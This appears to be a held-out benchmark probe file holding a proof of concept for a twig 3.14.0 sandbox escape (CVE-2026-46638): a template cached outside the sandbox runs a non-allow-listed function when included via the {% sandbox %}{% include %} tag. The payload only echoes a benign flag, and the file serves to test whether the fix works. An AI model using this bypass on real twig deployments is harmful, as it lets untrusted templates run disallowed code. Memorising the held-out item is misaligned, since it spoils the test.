#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-46638 residual exploit -- the incomplete-fix bypass of twig 3.14.0.

CVE-2024-45411's fix (twig 3.14.0) added an explicit `$loaded->unwrap()->checkSecurity()` to
CoreExtension::include(), closing the include() FUNCTION path. But the deprecated-yet-functional
`{% sandbox %}{% include %}` TAG path was overlooked: IncludeNode::compile() at 3.14.0 emits

    yield from $this->loadTemplate('evil.twig', ...)->unwrap()->yield($context);

with NO checkSecurity() re-invocation. Combined with the fact that a Template's compiled
checkSecurity() runs only once, from its constructor, gated by SandboxExtension::isSandboxed()
(and the instance is then cached in Environment::$loadedTemplates so the verdict is sticky), a
template loaded once OUTSIDE the sandbox keeps its unenforced "passed" verdict forever.

  1. The harness loads 'evil.twig' once outside the sandbox -> its checkSecurity() runs with
     isSandboxed()=false (no enforcement) -> cached in $loadedTemplates.
  2. The PoC renders `{% sandbox %}{% include 'evil.twig' %}{% endsandbox %}`. {% sandbox %} enables
     the sandbox, then {% include %} loads the CACHED evil.twig (constructor does NOT re-run) and
     yields it WITHOUT calling checkSecurity() -> the allow-list is never applied.
  3. `evil.twig` = `{{ pcb_flag() }}`; `pcb_flag` is NOT allow-listed, yet it runs -> the planted
     ${PCB_FLAG} token is emitted into the render output.

  V1 twig 3.14.0 : IncludeNode has no checkSecurity() for sandboxed includes -> ESCAPE (residual reaches flag).
  V2 twig 3.26.0 : the CVE-2026-46638 fix makes IncludeNode::compile() emit
                       $t->unwrap()->checkSecurity();
                   for sandboxed includes (matching CoreExtension::include()) -> allow-list re-applied
                   with the sandbox enabled -> SecurityNotAllowedFunctionError -> BLOCKED.

No offensive payload -- the "disallowed callable" pcb_flag() only echoes the benign per-run ${PCB_FLAG}.
"""

# {% sandbox %}{% include %} TAG form referencing the cached template NAME 'evil.twig'.
_TEMPLATE = "{% sandbox %}{% include 'evil.twig' %}{% endsandbox %}"


def candidate():
    return {"template": _TEMPLATE, "probe_id": "residual-cve-2026-46638-sandbox-tag-include-cached"}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
